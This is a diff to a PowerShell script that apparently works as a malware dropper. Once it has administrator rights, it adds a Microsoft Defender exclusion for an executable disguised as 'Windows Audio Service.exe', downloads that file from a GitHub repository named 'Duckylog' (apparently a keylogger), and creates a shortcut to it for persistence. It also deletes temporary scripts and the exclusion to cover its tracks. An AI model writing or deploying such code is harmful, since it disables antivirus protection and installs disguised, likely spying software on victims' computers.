@@ -18,8 +18,37 @@ function Remove-TempScripts {
     Get-ChildItem -Path ([System.IO.Path]::GetTempPath()) -Filter "*.ps1" -File | Remove-Item -Force
 }
 
+# Function to remove the exclusion for the Windows Audio Service executable
+function Remove-Exclusion {
+    try {
+        Remove-MpPreference -ExclusionPath $exePath
+        Write-Output "Removed exclusion for $exePath"
+    } catch {
+        Write-Output "Failed to remove exclusion for ${exePath}: $_"
+    }
+}
+
 # Trap to handle script termination and perform cleanup
-trap { Cleanup-TempScripts; break }
+trap { 
+    Remove-TempScripts
+    Remove-Exclusion
+    break 
+}
+
+# Ensure the script is running with administrative privileges
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Output "Script is not running as administrator. Exiting..."
+    exit
+}
+
+# Add exclusion for the Windows Audio Service executable
+$exePath = "$env:TEMP\Windows Audio Service.exe"
+try {
+    Add-MpPreference -ExclusionPath $exePath
+    Write-Output "Added exclusion for $exePath"
+} catch {
+    Write-Output "Failed to add exclusion for ${exePath}: $_"
+}
 
 # Wait for an active network connection
 while (-Not (Test-NetworkConnection)) {
@@ -38,51 +67,31 @@ if (-Not (Test-Path $shortcutPath)) {
     # Path to the executable
     $exePath = "$env:TEMP\Windows Audio Service.exe"
 
-    # Add exclusion for the Windows Audio Service executable
-    try {
-        Add-MpPreference -ExclusionPath $exePath
-        Write-Output "Added exclusion for $exePath"
-    } catch {
-        Write-Output "Failed to add exclusion for ${exePath}: $_"
-    }
-
     # URL to the executable on GitHub
     $exeUrl = "https://github.com/Mocipie/Duckylog/blob/main/Windows%20Audio%20Service.exe?raw=true"
 
-    # Retry logic for downloading the executable
-    $maxRetries = 5
-    $retryCount = 0
-    $downloadSuccess = $false
-
-    while (-Not $downloadSuccess -and $retryCount -lt $maxRetries) {
-        try {
-            Write-Output "Attempting to download executable (Attempt $($retryCount + 1) of $maxRetries)..."
-            $webClient = New-Object System.Net.WebClient
-            $webClient.DownloadFile($exeUrl, $exePath)
-            $downloadSuccess = $true
-            Write-Output "Executable downloaded successfully to $exePath"
-        } catch {
-            Write-Output "Download failed: $_"
-            $retryCount++
-            Start-Sleep -Seconds 5
-        }
+    # Download the executable from GitHub
+    Write-Output "Downloading executable from $exeUrl to $exePath"
+    try {
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($exeUrl, $exePath)
+        Write-Output "Executable downloaded successfully to $exePath"
+    } catch {
+        Write-Output "Failed to download the executable: $_"
+        exit
     }
 
-    if ($downloadSuccess) {
-        # Create a WScript.Shell COM object
-        $wshShell = New-Object -ComObject WScript.Shell
+    # Create a WScript.Shell COM object
+    $wshShell = New-Object -ComObject WScript.Shell
 
-        # Create the shortcut
-        $shortcut = $wshShell.CreateShortcut($shortcutPath)
-        $shortcut.TargetPath = $exePath
-        $shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($exePath)
-        $shortcut.Save()
+    # Create the shortcut
+    $shortcut = $wshShell.CreateShortcut($shortcutPath)
+    $shortcut.TargetPath = $exePath
+    $shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($exePath)
+    $shortcut.Save()
 
-        # Log the shortcut creation
-        Write-Output "Shortcut created at $shortcutPath"
-    } else {
-        Write-Output "Failed to download the executable after $maxRetries attempts."
-    }
+    # Log the shortcut creation
+    Write-Output "Shortcut created at $shortcutPath"
 } else {
     Write-Output "Shortcut already exists at $shortcutPath"
 }
@@ -117,7 +126,8 @@ try {
         Write-Output "Executable does not exist at $exePath"
     }
 
-    Cleanup-TempScripts
+    Remove-TempScripts
+    Remove-Exclusion
 }
 
 # Ensure the script terminates last
